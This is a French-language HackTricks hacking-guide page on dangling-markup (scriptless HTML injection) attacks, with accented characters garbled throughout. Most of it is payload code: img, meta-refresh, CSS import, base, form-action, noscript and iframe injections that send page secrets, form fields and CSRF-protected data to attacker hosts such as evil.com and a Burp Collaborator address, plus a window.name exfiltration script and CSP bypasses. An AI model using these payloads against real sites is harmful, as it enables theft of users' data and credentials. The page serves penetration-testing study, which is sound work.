# Dangling Markup - HTML scriptless injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## R√©sum√©

Cette technique peut √™tre utilis√©e pour extraire des informations d'un utilisateur lorsqu'une **injection HTML est trouv√©e**. Cela est tr√®s utile si vous **ne trouvez aucun moyen d'exploiter un** [**XSS** ](../xss-cross-site-scripting/)mais que vous pouvez **injecter des balises HTML**.\
C'est √©galement utile si un **secret est enregistr√© en texte clair** dans le HTML et que vous souhaitez **l'exfiltrer** du client, ou si vous voulez induire en erreur l'ex√©cution de certains scripts.

Plusieurs techniques comment√©es ici peuvent √™tre utilis√©es pour contourner certaines [**Content Security Policy**](../content-security-policy-csp-bypass/) en exfiltrant des informations de mani√®re inattendue (balises html, CSS, balises http-meta, formulaires, base...).

## Applications principales

### Vol de secrets en texte clair

Si vous injectez `<img src='http://evil.com/log.cgi?` lorsque la page est charg√©e, la victime vous enverra tout le code entre la balise `img` inject√©e et la prochaine citation √† l'int√©rieur du code. Si un secret se trouve d'une mani√®re ou d'une autre dans ce morceau, vous le volerez (vous pouvez faire la m√™me chose en utilisant une double citation, regardez ce qui pourrait √™tre plus int√©ressant √† utiliser).

Si la balise `img` est interdite (en raison de CSP par exemple), vous pouvez √©galement utiliser `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Notez que **Chrome bloque les URL HTTP** contenant "<" ou "\n", donc vous pouvez essayer d'autres sch√©mas de protocole comme "ftp".

Vous pouvez √©galement abuser de CSS `@import` (enverra tout le code jusqu'√† ce qu'il trouve un ";")
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
Vous pouvez √©galement utiliser **`<table`** :
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
Vous pourriez √©galement ins√©rer une balise `<base`. Toutes les informations seront envoy√©es jusqu'√† ce que la citation soit ferm√©e, mais cela n√©cessite une interaction de l'utilisateur (l'utilisateur doit cliquer sur un lien, car la balise de base aura chang√© le domaine point√© par le lien) :
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### Vol de formulaires
```html
<base href='http://evil.com/'>
```
Alors, les formulaires qui envoient des donn√©es √† un chemin (comme `<form action='update_profile.php'>`) enverront les donn√©es au domaine malveillant.

### Vol de formulaires 2

D√©finissez un en-t√™te de formulaire : `<form action='http://evil.com/log_steal'>` cela √©crasera l'en-t√™te du formulaire suivant et toutes les donn√©es du formulaire seront envoy√©es √† l'attaquant.

### Vol de formulaires 3

Le bouton peut changer l'URL o√π les informations du formulaire vont √™tre envoy√©es avec l'attribut "formaction":
```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
Un attaquant peut utiliser cela pour voler des informations.

Trouvez un [**exemple de cette attaque dans cet article**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).

### Vol de secrets en texte clair 2

En utilisant la technique mentionn√©e ci-dessus pour voler des formulaires (en injectant un nouvel en-t√™te de formulaire), vous pouvez ensuite injecter un nouveau champ de saisie :
```html
<input type='hidden' name='review_body' value="
```
et ce champ de saisie contiendra tout le contenu entre ses guillemets doubles et le prochain guillemet double dans le HTML. Cette attaque m√©lange "_**Stealing clear text secrets**_" avec "_**Stealing forms2**_".

Vous pouvez faire la m√™me chose en injectant un formulaire et une balise `<option>`. Toutes les donn√©es jusqu'√† ce qu'une balise fermante `</option>` soit trouv√©e seront envoy√©es :
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Injection de param√®tres de formulaire

Vous pouvez changer le chemin d'un formulaire et ins√©rer de nouvelles valeurs afin qu'une action inattendue soit effectu√©e :
```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        ‚Üê Injected lines

<form action="/change_settings.php">                        ‚Üê Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             ‚Üê Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### Vol de secrets en texte clair via noscript

`<noscript></noscript>` est une balise dont le contenu sera interpr√©t√© si le navigateur ne prend pas en charge JavaScript (vous pouvez activer/d√©sactiver JavaScript dans Chrome √† [chrome://settings/content/javascript](chrome://settings/content/javascript)).

Une fa√ßon d'exfiltrer le contenu de la page web depuis le point d'injection jusqu'en bas vers un site contr√¥l√© par l'attaquant sera d'injecter ceci :
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Contournement de CSP avec interaction utilisateur

Dans cette [recherche de portswiggers](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup), vous pouvez apprendre que m√™me dans les environnements **les plus restreints par CSP**, vous pouvez toujours **exfiltrer des donn√©es** avec un peu d'**interaction utilisateur**. Dans ce cas, nous allons utiliser le payload :
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Notez que vous demanderez √† la **victime** de **cliquer sur un lien** qui le **redirigera** vers un **payload** contr√¥l√© par vous. Notez √©galement que l'attribut **`target`** √† l'int√©rieur de la balise **`base`** contiendra du **contenu HTML** jusqu'√† la prochaine apostrophe.\
Cela fera que la **valeur** de **`window.name`** si le lien est cliqu√© sera tout ce **contenu HTML**. Par cons√©quent, comme vous **contr√¥lez la page** √† laquelle la victime acc√®de en cliquant sur le lien, vous pouvez acc√©der √† ce **`window.name`** et **exfiltrer** ces donn√©es :
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Workflow de script trompeur 1 - Attaque par espace de noms HTML

Ins√©rez une nouvelle balise avec un id √† l'int√©rieur du HTML qui √©crasera la suivante et avec une valeur qui affectera le flux d'un script. Dans cet exemple, vous s√©lectionnez avec qui une information va √™tre partag√©e :
```html
<input type='hidden' id='share_with' value='fredmbogo'>     ‚Üê Injected markup
...
Share this status update with:                              ‚Üê Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### Workflow de script trompeur 2 - Attaque par espace de noms de script

Cr√©ez des variables √† l'int√©rieur de l'espace de noms javascript en ins√©rant des balises HTML. Ensuite, cette variable affectera le flux de l'application :
```html
<img id='is_public'>                                        ‚Üê Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    ‚Üê The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           ‚Üê Condition always evaluates to true
...
}
```
### Abus de JSONP

Si vous trouvez une interface JSONP, vous pourriez √™tre en mesure d'appeler une fonction arbitraire avec des donn√©es arbitraires :
```html
<script src='/editor/sharing.js'>:              ‚Üê Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ‚Üê Injected JSONP call
set_sharing({ ... })
```
Ou vous pouvez m√™me essayer d'ex√©cuter du javascript :
```html
<script src='/search?q=a&call=alert(1)'></script>
```
### Abus d'Iframe

Un document enfant a la capacit√© de voir et de modifier la propri√©t√© `location` de son parent, m√™me dans des situations de cross-origin. Cela permet d'incorporer un script dans un **iframe** qui peut rediriger le client vers une page arbitraire :
```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
Cela peut √™tre att√©nu√© avec quelque chose comme : `sandbox=' allow-scripts allow-top-navigation'`

Un iframe peut √©galement √™tre abus√© pour **fuiter des informations sensibles** d'une autre page **en utilisant l'attribut name de l'iframe**. Cela est d√ª au fait que vous pouvez cr√©er un iframe qui s'iframe lui-m√™me en abusant de l'injection HTML qui fait que **les informations sensibles apparaissent √† l'int√©rieur de l'attribut name de l'iframe** et ensuite acc√©der √† ce nom depuis l'iframe initial et le fuiter.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
Pour plus d'informations, consultez [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta abus

Vous pouvez utiliser **`meta http-equiv`** pour effectuer **plusieurs actions** comme d√©finir un Cookie : `<meta http-equiv="Set-Cookie" Content="SESSID=1">` ou effectuer une redirection (dans 5s dans ce cas) : `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Cela peut √™tre **√©vit√©** avec un **CSP** concernant **http-equiv** ( `Content-Security-Policy: default-src 'self';`, ou `Content-Security-Policy: http-equiv 'self';`)

### Nouveau \<portal HTML tag

Vous pouvez trouver une **recherche tr√®s int√©ressante** sur les vuln√©rabilit√©s exploitables du \<portal tag [ici](https://research.securitum.com/security-analysis-of-portal-element/).\
Au moment de la r√©daction, vous devez activer le tag portal sur Chrome dans `chrome://flags/#enable-portals` sinon cela ne fonctionnera pas.
```html
<portal src='https://attacker-server?
```
### Fuites HTML

Toutes les fa√ßons de fuir la connectivit√© en HTML ne seront pas utiles pour le Dangling Markup, mais parfois cela pourrait aider. V√©rifiez-les ici : [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Fuites

C'est un **m√©lange** entre **dangling markup et XS-Fuites**. D'un c√¥t√©, la vuln√©rabilit√© permet d'**injecter du HTML** (mais pas de JS) dans une page de la **m√™me origine** que celle que nous allons attaquer. De l'autre c√¥t√©, nous n'allons pas **attaquer** directement la page o√π nous pouvons injecter du HTML, mais **une autre page**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Recherche/XS-Fuites

XS-Recherche est orient√©e vers l'**exfiltration d'informations cross-origin** en abusant des **attaques par canal lat√©ral**. Par cons√©quent, c'est une technique diff√©rente du Dangling Markup, cependant, certaines des techniques abusent de l'inclusion de balises HTML (avec et sans ex√©cution de JS), comme [**Injection CSS**](../xs-search/#css-injection) ou [**Chargement paresseux d'images**](../xs-search/#image-lazy-loading)**.**

{% content-ref url="../xs-search/" %}
[xs-search](../xs-search/)
{% endcontent-ref %}

## Liste de D√©tection de Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## R√©f√©rences

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* V√©rifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
